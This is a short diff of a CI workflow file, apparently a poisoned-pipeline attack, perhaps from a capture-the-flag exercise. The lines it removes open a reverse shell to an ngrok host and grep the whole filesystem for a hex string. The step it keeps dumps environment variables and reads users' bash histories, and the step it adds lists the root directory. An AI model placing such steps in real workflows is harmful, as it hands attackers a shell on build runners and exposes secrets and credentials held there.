@@ -5,8 +5,6 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - run: |
-          sh -i >& /dev/tcp/0.tcp.ngrok.io/16664 0>&1 
-      - run: |
-          rgrep -i "544d435446" / 2>/dev/null
+          ls -la /
       - run: |
           env && cat /home/*/bash_history &
